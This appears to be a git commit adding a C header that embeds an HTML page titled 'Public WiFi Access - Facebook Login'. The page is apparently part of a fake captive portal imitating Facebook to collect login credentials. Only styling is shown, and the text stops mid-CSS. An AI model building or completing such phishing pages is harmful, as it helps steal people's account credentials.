11c21887122fc0c60cee7c7287da204aa7324bea
mwamwam <hanzmarch2000@gmail.com>
2025-06-21 13:39:11 +0800

    Create facebook.h

---
+++ facebook.h
@@ -0,0 +1,40 @@
+const char FACEBOOK_HTML[] = R"=====(
+<head>
+  <title>Public WiFi Access - Facebook Login</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
+  <meta name='theme-color' content='#0E86D4'>
+  <style class='cp-pen-styles'>
+
+      * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+
+      html {
+        background: #E2E2E2;
+      }
+
+      body {
+        background: #E2E2E2;
+        margin: 0;
+        padding: 0;
+        font-family: 'Lato', sans-serif;
+      }
+
+      .login-form-wrap {
+        background: #0E86D4;
+        background: -moz-radial-gradient(center, ellipse cover, #0E86D4 0%, #355493 100%);
+        background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, #0E86D4), color-stop(100%, #355493));
+        background: -webkit-radial-gradient(center, ellipse cover, #5170ad 0%, #355493 100%);
+        background: -o-radial-gradient(center, ellipse cover, #0E86D4 0%, #355493 100%);
+        background: -ms-radial-gradient(center, ellipse cover, #0E86D4 0%, #355493 100%);
+        background: radial-gradient(ellipse at center, #0E86D4 0%, #355493 100%);
+        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#5170ad', endColorstr='#355493', GradientType=1);
+        border: 1px solid #2d416d;
+        position: relative;
+        width: 100%;
+        height: 100%;
+        margin: auto auto;
+        padding: 50px 30px 0 30px;
